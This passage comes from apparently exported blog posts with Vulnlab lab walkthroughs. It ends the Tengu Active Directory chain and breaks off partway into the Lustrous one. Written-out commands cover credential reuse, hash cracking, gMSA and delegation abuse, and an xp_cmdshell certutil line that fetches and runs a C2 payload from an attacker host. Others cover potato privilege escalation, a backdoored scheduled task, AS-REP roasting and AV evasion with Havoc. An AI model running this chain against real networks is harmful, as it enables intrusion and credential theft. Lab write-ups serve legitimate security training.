home folder.</p>\n<h1 id=\"Enabling-MSSQL-Database-Connection-on-NODERED\"><a href=\"#Enabling-MSSQL-Database-Connection-on-NODERED\" class=\"headerlink\" title=\"Enabling MSSQL Database Connection on NODERED$\"></a>Enabling MSSQL Database Connection on NODERED$</h1><p>I checked for credential reusage for any of the users through SSH or RDP on the other machines, however came back with no results. Given the name of the user <code>nodered_connector</code>, we can guess that these creds still belong to the Node-RED service.</p>\n<p>If we remember originally from the start of the box, there was an MSSQL node that was failing from one of the flow diagrams in Node-RED. If we take a look back at this, we can edit the SQL node information and we’ll find the same <code>nodered_connector</code> auto-filled into the credential option for this node. Entering our creds into this will cause the node error to disappear after deploying the diagram.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/g.jpg\"></p>\n<p>From here, we can determine whether or not we can access the MSSQL database by setting up a SOCKS proxy on the <code>.183</code> machine we have access to. Sliver has a built-in SOCKS5 proxy functionality, so we’ll use that alongside <code>proxychains</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (tengu) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then need to change our <code>/etc/proxychains4.conf</code> file to reflect this SOCKS proxy and connect to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ProxyList]</span><br><span class=\"line\"># add proxy here ...</span><br><span class=\"line\"># meanwile</span><br><span class=\"line\"># defaults set to &quot;tor&quot;</span><br><span class=\"line\">socks5  127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have access via the proxy, we can attempt to find the MSSQL service on <code>sql.tengu.vl</code> by trying to NMAP to all of the machines for it.</p>\n<ul>\n<li><code>proxychains4 nmap 10.10.187.183 -p1433 &amp;&amp; proxychains4 nmap 10.10.187.182 -p1433 &amp;&amp; proxychains4 nmap 10.10.187.183 -p1433</code></li>\n</ul>\n<p>We’ll see that we receive a hit on <code>10.10.187.182</code>. This means we should be able to authenticate to MSSQL on <code>.182</code> with the <code>nodered_connector</code> creds that we have. We’ll do so with Impacket.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -dc-ip 10.10.187.181 -target-ip 10.10.187.182 TENGU/&#x27;nodered_connector&#x27;:&#x27;[...snip...]&#x27;@10.10.187.182</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/tengu-vl/h.jpg\"></p>\n<h1 id=\"MSSQL-Database-Enumeration\"><a href=\"#MSSQL-Database-Enumeration\" class=\"headerlink\" title=\"MSSQL Database Enumeration\"></a>MSSQL Database Enumeration</h1><p>Now that we have access to the MSSQL service, we can look around each database to find any credentials for any other users. This <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\">HackTricks article</a> helped with utilizing a few MSSQL queries.</p>\n<p>In the <code>Demo</code> database, there is a user hash for <code>t2_m.winters</code>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (nodered_connector  nodered_connector@Demo)&gt; SELECT * FROM Users;</span><br><span class=\"line\">  ID   Username          Password                                                              </span><br><span class=\"line\">----   ---------------   -------------------------------------------------------------------   </span><br><span class=\"line\">NULL   b&#x27;t2_m.winters&#x27;   b&#x27;[...snip...]&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>I couldn’t find any success in using <code>JTR</code> or <code>Hashcat</code> with this hash, however I used the hash cracker on this <a href=\"https://hashes.com/en/tools/hash_identifier\">website</a> and found the respective credentials for this user.</p>\n<p>If you’ll notice in the <code>/home/tengu.vl</code> directory on the Linux machine, the user has a home folder within this directory. Even though this user is not within the <code>/etc/passwd</code> file (which would normally indicate to us that they are not an actual user on this system), we can still login as them using <code>su t2_m.winters</code> within the Linux machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nodered_svc@nodered:/tmp$ su t2_m.winters@tengu.vl</span><br><span class=\"line\">Password: </span><br><span class=\"line\">t2_m.winters@tengu.vl@nodered:/tmp$</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, we can see that we have permissions to run everything as root with <code>sudo -l</code> and <code>t2_m.winters</code> password. This means we can gain root access with <code>sudo su</code> and locate the first flag within <code>/root/root.txt</code>.</p>\n<h1 id=\"Pivoting-to-SQL\"><a href=\"#Pivoting-to-SQL\" class=\"headerlink\" title=\"Pivoting to SQL$\"></a>Pivoting to SQL$</h1><p>Just for some due diligence that I learned when doing the Hybrid chain a while back, I extracted <code>/etc/krb5.keytab</code> to my local machine and decrypted it using <a href=\"https://github.com/sosdave/KeyTabExtract\">KeyTabExtract</a>. This will give us the NTLM hash of the <code>NODERED$</code> machine account.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.</span><br><span class=\"line\">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.</span><br><span class=\"line\">[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.</span><br><span class=\"line\">[+] Keytab File successfully imported.</span><br><span class=\"line\">        REALM : TENGU.VL</span><br><span class=\"line\">        SERVICE PRINCIPAL : NODERED$/</span><br><span class=\"line\">        NTLM HASH : [...snip...]</span><br><span class=\"line\">        AES-256 HASH : [...snip...]</span><br><span class=\"line\">        AES-128 HASH : [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Whether or not we’ll need this is really up to the box. That being said, you’ll notice on the Wiki that it’s telling us to utilize delegation for our next vector. Originally I thought we’d do this to access <code>.182</code>, however it seems that machine was only used for the <code>MSSQL</code> purpose that we needed it for before, as it doesn’t seem to have anything else useful for us right now.</p>\n<p>Running <code>crackmapexec</code> through our DC seems to let us know that we have valid credentials to LDAP on the DC with <code>t2_m.winters</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec ldap 10.10.187.181 -u &#x27;t2_m.winters&#x27; -p &#x27;[...snip...]&#x27;                                              </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:389  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:135  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">SMB         10.10.187.181   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:389  ...  OK</span><br><span class=\"line\">LDAP        10.10.187.181   389    DC               [+] tengu.vl\\t2_m.winters:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Note that I did take a break here for the day, so the IP addresses will change. The new chain addresses will vary.</p>\n<p>Now that we have valid credentials to LDAP as a user, we can dump the domain using <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound</a>.</p>\n<p>In the Bloodhound GUI, I couldn’t find anything out of the ordinary for the <code>t2_m.winters</code>. They are a valid user to the LDAP service on the DC, but they don’t seem to have anything else. Let’s take a look at the machine account <code>NODERED$</code> that we currently have an NTLM hash for.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/i.jpg\"></p>\n<h1 id=\"ReadGMSAPassword-on-GMSA01\"><a href=\"#ReadGMSAPassword-on-GMSA01\" class=\"headerlink\" title=\"ReadGMSAPassword on GMSA01$\"></a>ReadGMSAPassword on GMSA01$</h1><p>It seems that our machine account <code>NODE-RED$</code> is a part of the <code>LINUX_SERVER</code> domain group, which has <code>ReadGMSAPassword</code> over <code>GMSA01$@tengu.vl</code>. This essentially means that we can read the respective password for this user as our <code>NODERED$</code> machine account. We can do so with crackmapexec.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec ldap dc.tengu.vl -u &#x27;NODERED$&#x27; -H [...snip...] --gmsa</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         dc.tengu.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:636  ...  OK</span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               [+] tengu.vl\\NODERED$:[...snip...] </span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               Account: gMSA01$              NTLM: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have credentials to this user, we can check what we can access to as this user in Bloodhound.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/j.jpg\"></p>\n<p>Our user <code>GMSA01$</code>, has constrained delegation rights on the SQL machine, <code>sql.tengu.vl</code>. This means that we are allowed to authenticate as any user to specific services (more than likely MSSQL in our case) onto this machine. We can also impersonate domain admins, meaning that we can potentially compromise this entire host just from this privilege.</p>\n<p>The victim in our case will be the SPN <code>MSSQLSvc/sql.tengu.vl</code> and will request a TGT for that SPN before using S4U2Self&#x2F;S4U2Proxy to impersonate the user we are requesting for.</p>\n<p>Note that we won’t be able to impersonate the Administrator as we only have an SPN for MSSQLSvc. You can verify the SPN by running LDAPSearch to query the domain with <code>t2_m.winters</code> credentials..</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 ldapsearch -LLL -x -H &#x27;ldap://10.10.138.229&#x27; -D &#x27;t2_m.winters@tengu.v&#x27; -w &#x27;Tengu123&#x27; -b &quot;dc=tengu,dc=vl&quot; &quot;(&amp;(objectClass=User)(msDS-AllowedToDelegateTo=*))&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">servicePrincipalName: MSSQLSvc/SQL.tengu.vl:1433</span><br><span class=\"line\">servicePrincipalName: MSSQLSvc/SQL.tengu.vl</span><br><span class=\"line\">objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat</span><br><span class=\"line\"> ion,DC=tengu,DC=vl</span><br><span class=\"line\"> [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>So we’ll need to find another user we can impersonate. If we had an SPN for CIFS, then we might be able to impersonate Administrator. That being said, if we look at the available users on <code>sql.tengu.vl</code>, we can try to find a few to impersonate.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/k.jpg\"></p>\n<p>You’ll notice that there is a DA on this machine, though using <code>impacket-getST</code> does not let me impersonate them. this is due to them being within the <code>Protected Users</code> group, meaning we can not request a MSSQL service ticket as them.</p>\n<p>If you didn’t notice, there is an SQL Admins group that appear in the search bar. Investigating into this group gives me the impression that <code>t1_m.winters</code> is a valid user we can potentially try.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-getST -spn &#x27;MSSQLSvc/sql.tengu.vl&#x27; &#x27;tengu.vl/GMSA01$@sql.tengu.vl&#x27; -hashes :[...snip...] -dc-ip 10.10.138.229 -impersonate &#x27;t1_m.winters&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ export KRB5CCNAME=t1_m.winters@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -k sql.tengu.vl</span><br><span class=\"line\">SQL (TENGU\\t1_m.winters  dbo@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SQL-MSSQL-XP-Cmdshell\"><a href=\"#SQL-MSSQL-XP-Cmdshell\" class=\"headerlink\" title=\"SQL$ MSSQL XP Cmdshell\"></a>SQL$ MSSQL XP Cmdshell</h1><p>We are able to successfully authenticate as this user into the MSSQL service and can now enumerate a little further into what we can achieve. It seems that we have the ability to run commands if we use <code>enable_xp_cmdshell</code> and <code>xp_cmdshell</code>, which means we now have code execution on the second machine.</p>\n<p>I also tested for AMSI with <code>xp_cmdshell &quot;powershell -e SW52b2tlLU1pbWlrYXR6&quot;</code>, it seems that AV is not enabled on this machine. In that case we can try to curl our Sliver payload to this machine and execute it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (TENGU\\t1_m.winters  dbo@master)&gt; xp_cmdshell powershell &quot;cd ..\\..; mkdir temp; cd C:\\temp; certutil.exe -urlcache -f http://10.8.0.173:9001/sql_tengu.exe sql_tengu.exe; .\\sql_tengu.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p>We should now have proper code execution as the <code>gMSA01$</code> user, as denoted below.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/l.jpg\"></p>\n<h1 id=\"Impersonating-SYSTEM-with-SharpEfsPotato\"><a href=\"#Impersonating-SYSTEM-with-SharpEfsPotato\" class=\"headerlink\" title=\"Impersonating SYSTEM with SharpEfsPotato\"></a>Impersonating SYSTEM with SharpEfsPotato</h1><p>If you’ll notice, this user has <code>SeImpersonatePrivilege</code>, meaning we can impersonate SYSTEM and spawn a named pipe onto PowerShell, which we can then run our <code>sql_tengu</code> binary again to get a session as SYSTEM. We’ll use <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a> for this and can get a SYSTEM shell relatively easily. Note that I tried doing this through Sliver’s UI, and was running into a token error. I dropped it locally to <code>sql.tengu.vl</code> and it seemed to work as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;cd C:\\temp; .\\sql_tengu.exe&quot; </span><br><span class=\"line\"></span><br><span class=\"line\">SharpEfsPotato by @bugch3ck</span><br><span class=\"line\">  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</span><br><span class=\"line\"></span><br><span class=\"line\">  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b9f1bb62-6bd4-4aa0-90d1-cca939fb5983/\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983</span><br><span class=\"line\">df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:</span><br><span class=\"line\">[x]RpcBindingSetAuthInfo failed with status 0x6d3</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\">[*] Session 2debc8b7 sql_tengu - 10.10.138.230:49693 (SQL) - windows/amd64 - Tue, 28 May 2024 14:34:18 EDT</span><br></pre></td></tr></table></figure>\n\n<p>We can now view the second flag which is within <code>C:\\Users\\Administrator\\Desktop</code>.</p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>Now that we have a SYSTEM shell on this machine, we can essentially dump all credentials on this machine with <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a>. Before we do this though, I went to verify if there were any users that we could potentially look at to pivot to the DC.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/m.jpg\"></p>\n<p>It seems that <code>T0_C.FOWLER</code> can do this, who is also a part of the <code>T0_Admins</code> domain group. If we are able to get their credentials, we may be able to authenticate to the DC and go from there. I also reset my SOCKS5 proxy to the SYSTEM session that we have right now just for due diligence, it shouldn’t really matter that much as far as I’m concerned.</p>\n<h1 id=\"Scheduled-Task-Exploitation\"><a href=\"#Scheduled-Task-Exploitation\" class=\"headerlink\" title=\"Scheduled Task Exploitation\"></a>Scheduled Task Exploitation</h1><p>Doing some enumeration, I couldn’t find much with PowerView. I then moved onto scheduled tasks, which showed some promise. Enumerating scheduled tasks can be done with the following: <code>schtasks /query /v /fo LIST &gt; tasklist.txt</code> </p>\n<p><img src=\"/images/vulnlab/tengu-vl/n.jpg\"></p>\n<p>There’s a task file denoted as <code>C:\\admin\\Task.ps1</code> that seems to be ran as <code>t0_c.fowler</code>, which is the user we are trying to escalate as. If we plant a reverse shell or attempt to execute our Sliver binary, we should be able to get a session as this user once this task is executed. (I just added <code>Start-Process &quot;C:\\temp\\sql_tengu.exe&quot;</code> to the bottom of the file.)</p>\n<p>You’ll notice though that this task is being ran once every day. We’ll need to speed this up. We can do so by forcing Task Scheduler to restart the task, by executing: <code>Get-ScheduledTask -TaskName &quot;Daily_Checkup&quot; | Start-ScheduledTask</code></p>\n<p>After waiting about a minute, we should get a new session as <code>c.fowler</code>.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/o.jpg\"></p>\n<p>Now that we are a DA and that we verified that we are a DA within the DC, we can view the contents of the Administrator’s directory on the DC through CIFS.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; cat \\\\dc.tengu.vl\\C$\\Users\\Administrator\\Desktop\\root.txt</span><br><span class=\"line\">VL&#123;...snip...&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have successfully rooted this machine! Big thanks to r0BIT for the development of this chain, it helped me strengthen a lot of the AD privilege escalation core fundamentals that I had learned about previously.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/p.jpg\"></p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick\">https://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick</a>.<br><a href=\"https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\">https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/</a><br><a href=\"https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\">https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13\">https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a><br><a href=\"https://hashes.com/en/tools/hash_identifier\">https://hashes.com/en/tools/hash_identifier</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a></p>\n"},{"title":"Lustrous - Vulnlab","date":"2024-06-05T20:45:32.000Z","keywords":"Vulnlab, Medium, Windows","description":"This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.","cover":"/images/vulnlab/lustrous-vl/lustrous_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis machine is an Active Directory environment that starts from the domain controller and pivots to a workstation before returning back to the DC. Given that we have two machines that are both Windows, I'd like to use Havoc instead of Sliver as our C2 for this walkthrough.\n\n# Enumeration\n\nGiven the IP range of the instance it seems that there are only two machines to this chain. Let's start with our usual NMAP scans across them both.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 22:59 EDT\nNmap scan report for 10.10.226.53\nHost is up (0.12s latency).\nNot shown: 985 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.60 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT\nNmap scan report for 10.10.226.54\nHost is up (0.13s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 23.69 seconds\n```\n\nI ran a few aggressive scans after this, it seems that both of these machines are Windows machines. The DC seems to be running on `.53` and a regular workstation is running on `.54`. The interesting part is that the entry point seems to be on `.53` as there are both HTTP and FTP ports enabled (with FTP having anonymous access).\n\nI'll also note down both of the DNS names for both machines below.\n\n```\nMachine 1 - LusDC.lustrous.vl\nMachine 2 - LusMS.lustrous.vl\n```\n\n# ASREP-roasting `ben.cox`\n\nAccessing the anonymous FTP instance gives us a file directory with 4 users, one of which being `ben.cox`. The file that they have in their home directory is `users.csv`, which seems to be a file that contains a few more users. I created a user list with mousepad, consisting of 5 users along with a few default users.\n\n```\nAdministrator\nGuest\nkrbtgt\nben.cox\nrachel.parker\ntony.ward\nwayne.taylor\nSQLServer2005SQLBrowserUser$LUSDC\n```\n\nGiven that we have a user list, we can run some basic Kerberos tests such as `GetNPUsers` and `GetUserSPNs` to see if any users are either kerberoastable or ASREProastable.\n\n```\n└─$ impacket-GetUserSPNs lustrous.vl/'Guest'@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request\n\n└─$ impacket-GetNPUsers lustrous.vl/'Guest'@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request\n\n$krb5asrep$23$ben.cox@LUSTROUS.VL:cb02cfec[...snip..]d749d0fc98c0c0731436c\n```\n\nIn our ASREP enumeration scan, you'll find that `ben.cox` has pre-auth enabled. \n\nWhen a user is trying to authenticate to a machine in the domain, they'll send an AS-REQ to the KDC to request for this login. If the request is valid and the authentication material is correct, the KDC will deliver an AS-REP in response to allow them to connect to their machine. If a user has `UF_DONT_REQUIRE_PREAUTH`, this means that they do not require any form of authentication or identification to request an AS-REP. The request has the users password hashed within it, meaning it is vulnerable to hash cracking.\n\nThis is the case for the `ben.cox` user, as `impacket-GetNPUsers` essentially used our user list to brute force all users to determine if they have `UF_DONT_REQUIRE_PREAUTH` set. Now that we have a valid AS-REP ticket, we can use `hashcat` to see if we can crack it. Make sure to copy the AS-REP ticket to a text file before using it with hashcat.\n\nOne more thing, you can find the specific hash cracking algorithm ID number to use on the example hashes website that `hashcat` provides [here](https://hashcat.net/wiki/doku.php?id=example_hashes). We're looking at ID 18200 for cracking KRB5 ASREP hashes for the request we have.\n\n```\n└─$ hashcat -a 0 -m 18200 bencox.txt /usr/share/wordlists/rockyou.txt\n\n[...snip...]65fe3adb19d749d0fc98c0c0731436c:[...snip...]\n```\n\nThe above command should crack it for you, and it should return a valid password for `ben.cox`. You can verify that this works by testing it against LDAP.\n\n```\n└─$ crackmapexec ldap 10.10.226.53 -u 'ben.cox' -p '[...snip...]'\nSMB         10.10.226.53    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.226.53    389    LUSDC            [+] lustrous.vl\\ben.cox:[...snip...]\n```\n\n# Dumping the Domain\n\nIf you attempt to use it for other services such as RDP, you'll notice that your creds won't be valid. That being said now that we have valid creds to LDAP, we can use them to dump all domain objects with [Bloodhound](https://github.com/BloodHoundAD/BloodHound).\n\n```\n└─$ bloodhound-python -d 'lustrous.vl' -u 'ben.cox' -p '[...snip...]' -c all -ns 10.10.226.53 --zip\n```\n\nThis should compress all of the domain objects into an archive which is compatible with Bloodhound. Omitting `--zip` will dump all of the objects based on categories (users, machines, etc.) which are still technically compatible, it's just much easier to do it through an archive.\n\nAfter starting Neo4j console and the GUI we'll upload our data and look around for any leads with our current user.\n\n![](/images/vulnlab/lustrous-vl/b.jpg)\n\nYou'll notice that our user `ben.cox` is within the `Remote Access` group, which I would assume is the equivalent of having `CanPSRemote` though I couldn't verify it off of Bloodhound.\n\n# Foothold as `ben.cox`\n\nI tested our access through WinRM, and it seems that we're able to access `LusMS` with our credentials.\n\n![](/images/vulnlab/lustrous-vl/c.jpg)\n\nNow that we have access through WinRM, let's look around the machine to see if there's anything we can download.\n\nFurthermore I also wanted to set up [Havoc C2](https://github.com/HavocFramework/Havoc) and plant a beacon onto this machine just so we can download and upload files easily. The reason as to why I'm using Havoc instead of Sliver is due to the fact that this first machine has AV enabled. Due to Havoc being a relatively new C2, the signatures for the binaries aren't detected in the current OS that these machines are running.\n\n![](/images/vulnlab/lustrous-vl/d.jpg)\n\nWe can now look around on the machine to determine if there's anything interesting for us to find. \n\n# DPAPI Secure String Decryption\n\nYou'll find an odd XML file on the machine within the `Desktop` directory of `ben.cox` after a bit of searching.\n\n```\n*Evil-WinRM* PS C:\\Users\\ben.cox\\Desktop> cat admin.xml\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\">\n<S N=\"UserName\">LUSMS\\Administrator</S>[...snip...]N=\"Password\">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367</SS>\n    </Props>\n  </Obj>\n</Objs>\n```\n\nAt first you'll think that this is a hash for the Administrator user, though it won't be detected by `JTR` or `Hashcat` properly. That's because it isn't - given that `System.Management.Automation.PSCredential` specifier. This tells us that it is a [DPAPI credential](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) - though it's the secure string version of the credential instead of a credential blob.\n\nDPAPI is a Windows-specific symmetric encryption of asymmetric private keys, and is used as a way to properly cache data without leaving them in plaintext around the machine. This is another method to storing credentials - as the data is encrypted using a key that is derived from the user's logon secrets or credentials.\n\nI've worked with DPAPI credentials as a privilege escalation route before, and relatively straightforward. All that's required on our behalf is to find both the `masterkey` and the `prekey` in order to decrypt the secure string. The `masterkey` can be found within `C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117` and is denoted by the \n\n```\n*Evil-WinRM* PS C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117> Get-ChildItem . -Force\n\n\nDirectory: C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a-hs-        12/26/2021  10:28 AM            904 BK-LUSTROUS\n-a-hs-        12/26/2021  10:28 AM            740 dff9ecd4-2ab1-4eed-ab72-b909047c4e56\n-a-hs-        12/26/2021  10:28 AM             24 Preferred\n```\n\nNormally we'd just use [Mimikatz](https://github.com/ParrotSec/mimikatz) and use the `masterkey` to decrypt the credential, but not only do we not have debug privilege to do that - we also don't have the ability to run `mimikatz` due to our low-level privilege. (And also we aren't dealing with a blob, but instead a secure string)\n\nWe'll need to do this locally in order to decrypt the string efficiently. We can use a tool called [PyPyKatz](https://github.com/skelsec/pypykatz), which is a built-in tool on the latest version of Kali.\n\nFirst we'll need to develop a few pre-keys to retrieve a proper plaintext `masterkey` that's derived on the domain SID and our current user's credentials.\n\n```\n└─$ pypykatz dpapi prekey password 'S-1-5-21-2355092754-1584501958-1513963426-1117' 